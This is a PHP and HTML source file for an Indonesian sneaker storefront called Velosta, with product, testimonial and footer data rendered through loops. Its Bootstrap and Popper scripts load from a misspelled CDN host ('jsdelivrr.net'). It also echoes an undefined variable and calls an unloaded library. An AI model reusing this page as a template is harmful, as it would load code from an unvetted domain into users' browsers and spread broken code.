<?php
// Variabel PHP untuk dinamisasi
$title = "Velosta - Belanja Tiap Hari";
$nav_items = [
    "Beranda" => "#homelink",
    "Tentang" => "#aboutlink",
    "Produk" => "#produklink",
    "Promo" => "#promolink",
    "Review" => "#reviewlink",
    "Kontak" => "#footerlink"
];

$collections = [
    ["image" => "./images/collection-11.png"],
    ["image" => "./images/collection-22.png"],
    ["image" => "./images/collection-33.png"]
];

// $collections = [
//   ["image" => "./images/collection-11.png", "title" => "Kualitas Terbaik", "desc" => "Menyediakan sepatu <br> dari bahan <br> berkualitas tinggi Menyediakan sepatu dari bahan berkualitas tinggi, dengan beragam pilihan <br> untuk memenuhi kebutuhan <b gaya dan kenyamanan anda"],
//   ["image" => "./images/collection-22.png", "title" => "Model Kekinian", "desc" => "Mengikuti tren terbaru dalam dunia fashion sepatu"],
//   ["image" => "./images/collection-33.png", "title" => "Pelayanan Ramah", "desc" => "Pelayanan yang responsif dan pengiriman yang cepat"]
// ];

$categories = [
    "All" => "filter-all",
    "Nike" => "filter-nike",
    "Adidas" => "filter-adidas",
    "Puma" => "filter-puma",
    "Vans" => "filter-vans"
];

// Deklarasi data produk
$products = [
    [
        "name" => "Nike Air Max",
        "price" => "Rp1.900.000",
        "category" => "Nike",
        "image" => "./products/pr1.png",
        "link" => "Nike/NikeAir.php",
        "discount" => null
    ],
    [
        "name" => "Nike Air Force",
        "price" => "Rp21.000.000",
        "category" => "Nike",
        "image" => "./products/pr2.png",
        "link" => "Nike/NikeForce.php",
        "discount" => null
    ],
    [
        "name" => "Nike ZoomX",
        "price" => "Rp5.200.000",
        "category" => "Nike",
        "image" => "./products/pr3.png",
        "link" => "Nike/NikeZoom.php",
        "discount" => null
    ],
    [
        "name" => "Nike Vapor",
        "price" => "Rp12.200.000",
        "category" => "Nike",
        "image" => "./products/pr4.png",
        "discount" => null,
        "link" => "Nike/NikeVapor.php"

    ],
    [
        "name" => "Adidas Boost",
        "price" => "Rp7.250.000",
        "category" => "Adidas",
        "image" => "./products/pr5.png",
        "discount" => null,
        "link" => "Adidas/AdidasBoost.php",

    ],

    [
        "name" => "Adidas Sneakers",
        "price" => "Rp52.000.000",
        "category" => "Adidas",
        "image" => "./products/pr6.png",
        "discount" => null,
        "link" => "Adidas/AdidasSneakers.php",

        "actions" => true
    ],
    [
        "name" => "Adidas Adizero",
        "price" => "Rp210.000.000",
        "category" => "Adidas",
        "image" => "./products/pr7.png",
        "discount" => null,
        "link" => "Adidas/AdidasAdizero.php",

        "actions" => true
    ],
    [
        "name" => "Adidas Swift",
        "price" => "Rp1.250.000",
        "category" => "Adidas",
        "image" => "./products/pr8.png",
        "discount" => null,
        "link" => "Adidas/AdidasSwift.php",

        "actions" => true
    ],
    [
        "name" => "Puma Ignite",
        "price" => "Rp42.000.000",
        "category" => "Puma",
        "image" => "./products/pr9.png",
        "discount" => null,
        "link" => "Puma/PumaIgnite.php",

        "actions" => true
    ],
    [
        "name" => "Puma Enzo",
        "price" => "Rp3.500.000",
        "category" => "Puma",
        "image" => "./products/pr10.png",
        "discount" => null,
        "link" => "Puma/PumaEnzo.php",

        "actions" => true
    ],
    [
        "name" => "Puma Hybrid",
        "price" => "Rp4.200.000",
        "category" => "Puma",
        "image" => "./products/pr11.png",
        "link" => "Puma/PumaHybrid.php",

        "discount" => null
    ],
    [
        "name" => "Puma Cell",
        "price" => "Rp13.500.000",
        "category" => "Puma",
        "image" => "./products/pr12.png",
        "link" => "Puma/PumaCell.php",

        "discount" => null
    ],
    [
        "name" => "Vans Classic Old",
        "price" => "Rp23.500.000",
        "category" => "Vans",
        "image" => "./products/pr13.png",
        "link" => "Vans/VansClassic.php",

        "discount" => null
    ],
    [
        "name" => "Vans Authentic",
        "price" => "Rp17.000.000",
        "category" => "Vans",
        "image" => "./products/pr14.png",
        "link" => "Vans/VansAutenthic.php",

        "discount" => null
    ],
    [
        "name" => "Vans Slip-On",
        "price" => "Rp9.200.000",
        "category" => "Vans",
        "image" => "./products/pr15.png",
        "link" => "Vans/VansSlip.php",

        "discount" => null
    ],
    [
        "name" => "Vans Old Skool",
        "price" => "Rp3.500.000",
        "category" => "Vans",
        "image" => "./products/pr16.png",
        "link" => "Vans/VansOld.php",

        "discount" => null
    ],


];

 // CTA section data
 $cta_items = [
    [
      'image' => './images/cta-1.png',
      'subtitle' => 'Adidas Shoes',
      'title' => 'Diskon Musim Panas Hingga 50%',
      'link' => '#'
    ],
    [
      'image' => './images/cta-2.png',
      'subtitle' => 'Nike Shoes',
      'title' => 'Tetap Sporty dengan Gaya Anda',
      'link' => '#'
    ]
  ];

  // Testimonial data
  $testimonials = [
    [
      'image' => 'images/customer-1.jpg',
      'name' => 'Thor John',
      'text' => 'Saya menemukan situs web sepatu ini dan memutuskan untuk mencobanya. Wah, saya terkesan! Kualitas sepatu melebihi ekspektasi saya, dan layanan pelanggannya luar biasa. Saya pasti akan menjadi pelanggan tetap!',
      'stars' => '★★★★★'
    ],
    [
      'image' => 'images/customer-2.jpg',
      'name' => 'John Wick',
      'text' => 'Saya telah mencari sepasang sepatu yang sempurna selama berbulan-bulan, dan akhirnya saya menemukannya di situs web ini. Tidak hanya bergaya dan nyaman, tetapi proses pemesanannya pun lancar.',
      'stars' => '★★★★★'
    ],
    [
      'image' => 'images/customer-3.jpg',
      'name' => 'James Jackie',
      'text' => 'Saya bukan orang yang sering memberikan ulasan, tetapi saya harus melakukannya untuk situs web ini. Variasi sepatu yang tersedia sangat banyak, dan harganya tidak ada duanya.',
      'stars' => '★★★★★'
    ]
  ];

  // Instagram post data
  $insta_posts = [
    './images/insta-1.jpg', './images/insta-2.jpg', './images/insta-3.jpg',
    './images/insta-4.jpg', './images/insta-5.jpg', './images/insta-6.jpg',
    './images/insta-7.jpg', './images/insta-8.jpg'
  ];

  $footer_logo = './images/logo.png';
  $social_links = [
    'facebook' => '#',
    'twitter' => 'https://twitter.com/AgusHam95132560',
    'whatsapp' => 'https://wa.me/6281255434750',
    'instagram' => 'https://www.instagram.com/_velosta/profilecard/?igsh=eTF1djB3MWR1Y3o2'
  ];

  // Contact Us details
  $contact_info = [
    'address' => 'Menara 165, Jln Tb. Simatupang',
    'phone' => '081255434750',
    'email' => 'velosta@help.com'
  ];

  // Footer navigation links
  $footer_navigation = [
    'Akun' => '#',
    'Keranjang' => '#',
    'Favorit' => '#',
    'Lihat Produk' => '#',
    'Suka' => '#'
  ];

  // Operational hours
  $operating_hours = [
    'Senin - Selasa' => '8AM - 10PM',
    'Rabu - Kamis' => '8AM - 7PM',
    'Jum\'at' => '7AM - 12PM',
    'Sabtu' => '9AM - 8PM',
    'Minggu' => 'Tutup'
  ];



?>
<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $title; ?></title>
    <script>

    </script>
    <link rel="stylesheet" href="styles.css">
    <script>
  const produkData = <?php echo json_encode($produkData); ?>;
</script>

    <link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@300;400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" href="images/logoaja.png" type="image/x-icon">
    <link href="https://cdn.jsdelivrr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">

</head>

<body id="top">
    <!-- header navbar -->
    <header class="header" id="header1" data-header>
        <div class="container">
            <div class="overlay" data-overlay></div>
            <a href="#" class="logo">
                <img src="./images/logo.png" width="250" height="50" alt="Footcap logo">
            </a>
            <button class="nav-open-btn" data-nav-open-btn aria-label="Open Menu">
                <ion-icon name="menu-outline"></ion-icon>
            </button>
            <nav class="navbar" data-navbar>
                <button class="nav-close-btn" data-nav-close-btn aria-label="Close Menu">
                    <ion-icon name="close-outline"></ion-icon>
                </button>
                <ul class="navbar-list">
                    <?php foreach ($nav_items as $name => $link): ?>
                        <li class="navbar-item">
                            <a href="<?php echo $link; ?>" class="navbar-link"><?php echo $name; ?></a>
                        </li>
                    <?php endforeach; ?>
                </ul>
                <ul class="nav-action-list">
                     <li>
                        <a href="registrasi.php" class="nav-action-btn">
                            <ion-icon name="person-outline" aria-hidden="true"></ion-icon>
                            <span class="nav-action-text">Masuk / Daftar</span>
                        </a>
                    </li>
                    <li>
                        <button class="nav-action-btn" id="btn-favorit">
                            <ion-icon name="heart-outline" aria-hidden="true"></ion-icon>
                            <span class="nav-action-text">Favorit</span>
                            <span class="nav-notification" id="favorit-count">0</span>
                        </button>
                    </li>
                    <li>
                        <button class="nav-action-btn" id="btn-keranjang">
                            <ion-icon name="cart-outline" aria-hidden="true"></ion-icon>
                            <data class="nav-action-text">Nike</data>
                            <span class="nav-notification" id="keranjang-count">0</span>
                        </button>
                    </li>
                </ul>
                
            </nav>
        </div>
    </header>

<!-- Modal Favorit -->
<div id="modal1" class="modal1">
    <div class="modal-content">
        <span class="close-btn" onclick="toggleModal('modal1')">&times;</span>
        <h3>Daftar Favorit</h3>
        <ul id="favorit-list"></ul>
    </div>
</div>

<!-- Modal Keranjang -->
<div id="modal2" class="modal1">
    <div class="modal-content">
        <span class="close-btn" onclick="toggleModal('modal2')">&times;</span>
        <h3>Daftar Keranjang</h3>
        <ul id="keranjang-list"></ul>
    </div>
</div>


    <!-- hero -->
    <section class="hero-slider">
        <div class="slider">
            <div class="slide"><img src="gambar1.png" alt="Gambar 1"></div>
            <div class="slide"><img src="gambar2.png" alt="Gambar 2"></div>
            <div class="slide"><img src="gambar3.png" alt="Gambar 3"></div>
        </div>
    </section>

    <!-- About Us -->
    <div class="container-clr" id="aboutlink">
        <div class="clr-one"></div>
        <div class="clr-two"></div>
    </div>
    <section class="about">
        <div class="about-content">
            <h1 id="aboutjudul">Tentang Kami</h1>
            <p id="aboutpenjelasan">Kenapa Harus Belanja Sepatu Di Website Kami?</p>
        </div>
        <div class="section colletion">
            <section class="section-collection">
                <div class="container">
                    <ul class="collection-list has-scrollbar">
                        <?php foreach ($collections as $collection): ?>
                            <li>
                                <div class="collection-card" style="background-image: url('<?php echo $collection['image']; ?>')">
                                  
                                <!-- <h3 class="h4 card-title" style="color: black; font-size: 25px;  margin-top: 15px;"><?php echo $collection['title']; ?></h3>
<a href="#">
    <span id="isi1" style="color: black; font-size: 17px; margin-bottom: 30px; display: block; text-align: left;"> -->
        <!-- <?php echo $collection['desc']; ?> -->
    </span>
</a>

                                </div>
                            </li>
                        <?php endforeach; ?>
                    </ul>
                </div>
            </section>
        </div>
    </section>
<br  id="produklink">
    <!-- produk -->
    <section class="section-product">
    <div class="container">
        <h2 style="color: black; font-size: 35px; text-align: center; margin-bottom: 30px;" >Produk Terlaris</h2>

        <!-- Filter List -->
        <ul class="filter-list">
            <?php foreach ($categories as $label => $id): ?>
                <li>
                    <button class="filter-btn <?= $id === 'filter-all' ? 'active' : '' ?>" id="<?= $id ?>">
                        <?= $label ?>
                    </button>
                </li>
            <?php endforeach; ?>
        </ul>

        <ul class="product-list">
            <?php foreach ($products as $product): ?>
                <li class="product-item" data-category="<?= $product['category'] ?>">
                    <div class="product-card" tabindex="0">
                        <figure class="card-banner">
                            <img src="<?= $product['image'] ?>" width="312" height="350" loading="lazy" alt="<?= $product['name'] ?>" class="image-contain">
                            
                            <?php if (!empty($product['badge'])): ?>
                                <div class="card-badge"><?= $product['badge'] ?></div>
                            <?php endif; ?>

                            <ul class="card-action-list">
                                <li class="card-action-item">
                                    <button class="card-action-btn btn-add-keranjang" aria-labelledby="card-label-1" >
                                        <ion-icon name="cart-outline"></ion-icon>
                                    </button>
                                    <div class="card-action-tooltip" id="card-label-1">Masukan Keranjang</div>
                                </li>
                                <li class="card-action-item">
                                    <button class="card-action-btn btn-add-favorit" aria-labelledby="card-label-2" class="btn-add-favorit">
                                        <ion-icon name="heart-outline"></ion-icon>
                                    </button>
                                    <div class="card-action-tooltip" id="card-label-2">Suka</div>
                                </li>
                                <li class="card-action-item">
                                <a href="<?= $product['link'] ?>" class="card-action-btn" aria-labelledby="card-label-3">
                                    <ion-icon name="eye-outline"></ion-icon>
                                </a>
                                <div class="card-action-tooltip" id="card-label-3">Lihat Produk</div>
                            </li>

                               
                            </ul>

                          
                        </figure>

                        <div class="card-content">
                            <h3 class="h3 card-title" style="color: black; font-size: 25px;">
                                <a href="<?= $product['link'] ?>"><?= $product['name'] ?></a>
                            </h3>
                            <data class="card-price" style="color: black; font-size: 18px;">
                                <?= $product['price'] ?>
                                <?php if (!is_null($product['discount'])): ?>
                                    <del><?= $product['discount'] ?></del>
                                <?php endif; ?>
                            </data>
                            <button class="buy-now" onclick="window.location.href='<?= $product['link'] ?>'" >Beli Sekarang</button>
                        </div>
                    </div>
                </li>
            <?php endforeach; ?>
        </ul>
    </div>
</section>


<br id="promolink">

<!-- CTA Section -->
<section class="section-cta">
  <div class="container">
    <ul class="cta-list">
      <?php foreach ($cta_items as $cta): ?>
        <li>
          <div class="cta-card" style="background-image: url('<?php echo $cta['image']; ?>')">
            <p class="card-subtitle"><?php echo $cta['subtitle']; ?></p>
            <h3 class="h2 card-title"><?php echo $cta['title']; ?></h3>
            <a href="<?php echo $cta['link']; ?>" class="btn btn-link">
              <span id="reviewlink">Belanja Sekarang</span>
              <ion-icon name="arrow-forward-outline" aria-hidden="true"></ion-icon>
            </a>
          </div>
        </li>
      <?php endforeach; ?>
    </ul>
  </div>
</section>

<!-- Testimonial Section -->
<section>
  <div class="section testimonials">
    <section class="section-testimonials">
      <div class="container">
        <h2 class="h2 section-title" style="color: black !important; font-size: 30px;">Apa Kata Pelanggan Kami</h2>
        <ul class="testimonials-list has-scrollbar">
          <?php foreach ($testimonials as $testimonial): ?>
            <li>
              <div class="testimonial-card">
                <img src="<?php echo $testimonial['image']; ?>" alt="<?php echo $testimonial['name']; ?>" class="customer-image">
                <h3 class="h4 card-title" style="color: black;"><?php echo $testimonial['name']; ?></h3>
                <p class="testimonial-text" style="color: black;"><?php echo $testimonial['text']; ?></p>
                <div class="stars"><?php echo $testimonial['stars']; ?></div>
              </div>
            </li>
          <?php endforeach; ?>
        </ul>
      </div>
    </section>
  </div>
</section>

<!-- Instagram Post Section -->
<section class="section insta-post">
  <ul class="insta-post-list has-scrollbar">
    <?php foreach ($insta_posts as $post): ?>
      <li class="insta-post-item">
        <img src="<?php echo $post; ?>" width="100" height="100" loading="lazy" alt="Instagram post" class="insta-post-banner image-contain">
        <a href="#" class="insta-post-link">
          <ion-icon name="logo-instagram"></ion-icon>
        </a>
      </li>
    <?php endforeach; ?>
  </ul>
</section>

<!-- Footer Section -->
<footer class="footer" id="footerlink">
  <div class="footer-top section">
    <div class="container">
      
      <!-- Footer Brand -->
      <div class="footer-brand">
        <a href="#" class="logo">
          <img src="<?php echo $footer_logo; ?>" width="160" height="50" alt="Footcap logo">
        </a>
        <ul class="social-list">
          <?php foreach ($social_links as $social => $link): ?>
            <li>
              <a href="<?php echo $link; ?>" class="social-link">
                <ion-icon name="logo-<?php echo $social; ?>"></ion-icon>
              </a>
            </li>
          <?php endforeach; ?>
        </ul>
      </div>

      <!-- Footer Link Box -->
      <div class="footer-link-box">
        
        <!-- Contact Us Section -->
        <ul class="footer-list">
          <li>
            <p class="footer-list-title" style="color: white">Hubungi Kami</p>
          </li>
          <li>
            <address class="footer-link">
              <ion-icon name="location"></ion-icon>
              <span class="footer-link-text"><?php echo $contact_info['address']; ?></span>
            </address>
          </li>
          <li>
            <a href="tel:+<?php echo $contact_info['phone']; ?>" class="footer-link">
              <ion-icon name="call"></ion-icon>
              <span class="footer-link-text"><?php echo $contact_info['phone']; ?></span>
            </a>
          </li>
          <li>
            <a href="mailto:<?php echo $contact_info['email']; ?>" class="footer-link">
              <ion-icon name="mail"></ion-icon>
              <span class="footer-link-text"><?php echo $contact_info['email']; ?></span>
            </a>
          </li>
        </ul>

        <!-- Footer Navigation Links -->
        <ul class="footer-list">
          <li>
            <p class="footer-list-title" style="color: white">Pengaturan</p>
          </li>
          <?php foreach ($footer_navigation as $text => $link): ?>
            <li>
              <a href="<?php echo $link; ?>" class="footer-link">
                <ion-icon name="chevron-forward-outline"></ion-icon>
                <span class="footer-link-text"><?php echo ucfirst($text); ?></span>
              </a>
            </li>
          <?php endforeach; ?>
        </ul>

        <!-- Operational Hours -->
        <div class="footer-list">
          <p class="footer-list-title" style="color: white">Jam Operasional</p>
          <table class="footer-table" style="color: white">
            <tbody>
              <?php foreach ($operating_hours as $day => $hours): ?>
                <tr class="table-row" style="color: white">
                  <th class="table-head" scope="row" style="color: white"><?php echo $day; ?>:</th>
                  <td class="table-data" style="color: white"><?php echo $hours; ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>

        <!-- Newsletter -->
        <div class="footer-list">
          <p class="footer-list-title" style="color: white">Kabar</p>
          <p class="newsletter-text">Menjadi Website Marketplace Sepatu Terbaik Di Indonesia</p>
          <form action="" class="newsletter-form">
            <input type="email" name="email" required placeholder="Email Address" class="newsletter-input">
            <button type="submit" class="btn btn-primary">Kirim</button>
          </form>
        </div>
        
      </div>
    </div>
  </div>
</footer>


<script src="script.js"></script>
  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
  <script src="https://cdn.jsdelivrr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script src="https://cdn.jsdelivrr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>

  <script>
    AOS.init();
  </script>
</body>

</html>
